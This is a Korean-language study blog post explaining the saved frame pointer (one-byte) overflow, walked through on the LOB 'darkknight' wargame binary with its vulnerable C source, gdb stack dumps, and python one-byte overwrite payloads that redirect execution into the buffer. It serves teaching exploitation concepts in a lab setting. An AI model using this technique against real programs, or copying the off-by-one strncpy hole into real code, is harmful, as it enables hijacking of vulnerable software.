---
title: "SFP(Stack Frame Pointer) Overflow"
tags: [System, Stack Frame Pointer, Frame Pointer Overwrite, 1Byte Overflow]
author: eli_ez3r
key: 20191017
modify_date: 2019-10-17
article_header:
  type: cover
  image:
    src: http://eliez3r.synology.me/assets/img/study/system-logo.png
---



# SFP Overflow란?

SFP(Stack Frame Pointer) Overflow, FPO(Frame Pointer Overwrite), 1 Byte Overflow 라고도 불리는 공격기법이다.



SFP Overflow는 단 1Byte 만을 조작하여 IP(Instruction Pointer)의 흐름을 제어할 수 있는 공격기법이다.

SFP의 마지막 한 바이트를 Shell Code가 저장되어 있는 주소로 변조한다면 **함수 에필로그**에 의해 흐름을 제어할 수 있다.

SFP Overflow를 이해하기 위해서는 먼저 SFP(Stack Frame Pointer)가 무엇인지 알아야 한다.

SFP는 Saved Frame Pointer라고도 불리며, **이전 함수의 EBP 주소**를 저장하고 있는 공간이다.

먼저 Stack Frame에 대해 자세히 알 필요가 있다. ([Stack Frame이란?]( https://eliez3r.github.io/post/2019/10/16/study-system.Stack-Frame.html ))

여기서 SFP Overflow는 SFP의 마지막 Byte를 Overwrite하여 해커가 원하는 프로그램 흐름으로 바꾸는 것을 말한다. 단 1Byte만으로도 프로그램 전체의 흐름이 바꿀 수 있다는 것이 매력적인 공격 기법이다.

-----

## SFP Overflw 실습(LOB level12번 darkknight 문제)

```c
#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
	char buffer[40];
	strncpy(buffer, src, 41);
	printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
	if(argc<2){
		printf("argv error\n");
		exit(0);
	}

	problem_child(argv[1]);
}
```

[LOB Level 12번 문제]( https://eliez3r.github.io/post/2018/08/30/writeup-lob-12.darkknight.html )(darkknight) 문제가 SFP Overflow 실습에 있어 가장 적합한 문제라고 생각되어진다. (<u>이 포스트에서는 문제를 푸는것이 목적이 아닌 SFP Overflow를 이해하는것을 목적으로 한다.</u>)

problem_child 함수를 보면 strncpy함수를 통해 main함수 argv[1] 인자의 41byte를 buffer에 저장하는데 buffer의 크기는 40byte이다. 

따라서 1byte가 Overflow되어 problem_child함수의 sfp가 영향을 받게 된다. (다시한번 강조 [Stack Frame이란?]( https://eliez3r.github.io/post/2019/10/16/study-system.Stack-Frame.html ) 먼저 이해하고 오자.)

-----

일단 main함수에서 problem_child를 호출하고 buffer배열까지 공간을 할당하게 되었을 때에 스택의 구조는 다음과 같다.

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571214325423.png" width="600px">

SFP 1byte가 Overwrite 됐을 때 프로그램이 어떻게 흘러가는지 알아보자.

정상적인 프로그램에서 함수의 에필로그 과정을 살펴보면 다음과 같다.

```
(gdb) r `python -c 'print "A"*4+"B"*36+"C"'`  //실행 명령어
```

4byte의 "A"와 36byte의 "B" 그리고 마지막 sfp 1byte를 덮어쓸 "C"를 넣어주었다.

problem_child 함수내의 leave가 실행되기 직전에 스택 상태이다.

```
(gdb) x/15x $esp
0xbffffc84:     0x41414141      0x42424242      0x42424242      0x42424242
0xbffffc94:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffffca4:     0x42424242      0x42424242      0xbffffc43      0x0804849e
0xbffffcb4:     0xbffffe06      0xbffffcd8      0x400309cb
```

이를 보기쉽게 그림으로 표시하면 다음과 같다. (검정색은 해당 스택의 주소, 파랑색은 해당 스택에 저장된 값, 빨강색은 사용자가 입력한 값)

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571278048851.png" width="600px">

problem_child SFP의 값을 보면 마지막에 **0x43**이 들어간 것을 볼수있다. 이는 argv[1]의 마지막 byte의 값이 "C(0x43)"이기 때문에 strncpy를 하면서 덮여씌워진 것이다.

그럼 이상태에서 함수 에필로그를 진행하면 레지스트리 값이 어떻게 변하는지 살펴보자.

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571214379330.png" width="600px">

problem_child 함수의 에필로그가 시작하기 직전에 eip, ebp, esp 레지의 상태값이다.

leave 명령어는 `mov esp, ebp` 와 `pop ebp`로 구성된 명령어이다.

leave명령어를 2단계로 쪼개서 사진으로 살펴보자.

-----

### 1) problem_child 함수의 leave

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571214508497.png" width="600px">

`mov esp, ebp`를 실행하면 esp값이 ebp의 값과 동일하게 된다.

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571214637643.png" width="600px">

`pop ebp`를 하면 esp가 가리키는 곳의 값을 ebp로 넣고 esp는 4byte증가하게 된다.

> 이때 sfp값이 1byte(0x43)덮어 씌워져있었으므로 ebp는 엉뚱한 곳(0xbffffc43)을 가리키고 있게 된다.



### 2) problem_child 함수의 ret

그리고 ret는 `pop eip`, `jmp eip`로 진행되어진다.

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571214850448.png" width="600px">

`pop eip` 명령에 의해서 eip에 esp가 가리키던 값 `0x0804849e`값이 들어가고 esp를 pop명령어에 의해 4byte 증가하게 된다. 그리고 jmp eip 명령어를 통해 프로그램이 `0x0804849e` 주소를 실행하게 된다.

```
Dump of assembler code for function main:
=======================(생략)============================
0x8048499 <main+45>:    call   0x8048440 <problem_child>
0x804849e <main+50>:    add    %esp,4
0x80484a1 <main+53>:    leave
0x80484a2 <main+54>:    ret
```

`0x0804849e` 주소는 main함수에서 problem_child 함수를 호출하고 난 바로 다음 코드의 주소이다.



### 3) main함수에서 problem_child함수 스택 정리

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571215063447.png" width="600px">

`add %esp, 4` 명령어를 수행하게 되면 esp값은 4가 증가하게 된다.

그리고나서 바로 main함수의 leave와 ret를 만나게 된다.



### 4) main 함수의 leave

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571275687784.png" width="600px">

`mov esp, ebp`명령에 의해서 esp값이 `0xbffffc43`으로 바뀐다.

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571276328187.png" width="600px">

`pop ebp`명령으로 esp가 가리키고 있는 값(0xfffc7440)이 ebp에 들어가게 된다. 스택의 정확한 값들을 살펴보면 다음과 같다.

```
(gdb) x/4x 0xbffffc43
0xbffffc43:     0xfffc7440      0x00a970bf      0xfffe2f40      0xfffcacbf
```



### 5) main 함수의 ret

<img src="http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/1571276427498.png" width="600px">

그리고 `pop eip` 명령을 통해 esp가 가리키고 있던 주소(0xbffffc47)의 값 `0x00a970bf` 값이 eip로 들어가고 esp는 4증가한다.  그리고 최종적으로 `jmp eip`를 통해 해당 주소로 점프해 명령을 수행하게 된다.

![](http://eliez3r.synology.me/assets/img/study/system/SFP Overflow/gif.GIF){: width="70%" height="70%"}

-----

이렇게 하나하나보면 장황해보이지만 정리하면 간단하다.

처음 우리가 problem_child함수의 SFP를 1byte 조작하여 `0xbffffc43` 으로 조작되었고, **최종적으로 실행되는 명령주소는 `0xbffffc47` 주소에 들어있는 주소값(조작한 값의 +4한 주소)이다.**

정확하게 확인해보자.

buffer의 시작주소는 `0xbffffc84`이다. 마지막 1byte를 `\x84` 로 바꿔보자. (-4 하지 않은 값)

```
[golem@localhost golem]$ ./aarkknight `python -c 'print "A"*4+"B"*36+"\x84"'`
AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB꾻퓹♠?왠?옹   ♥@☻
Segmentation fault (core dumped)
[golem@localhost golem]$ gdb -q -c core
Core was generated by `./aarkknight AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB?.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
```

위와 같이 `0x42424242` 주소를 알지 못해 에러메시지를 표시한다. 그러면 -4한 값을 넣어주면?

```
[golem@localhost golem]$ ./aarkknight `python -c 'print "A"*4+"B"*36+"\x80"'`
AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB?퓹? ♠?왠?옹   ♥@☻
Segmentation fault (core dumped)
[golem@localhost golem]$ gdb -q -c core
Core was generated by `./aarkknight AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
```

buffer배열의 첫 4byte("AAAA")를 실행하려는 모습을 볼 수 있다. 만약 buffer배열에 Shell Code를 넣어두었다면 Shell Code가 실행되는 상황이 된다.

이처럼 sfp값의 1byte만을 Overwrite하여 프로그램의 흐름을 바꿀수 있게 된다.

-----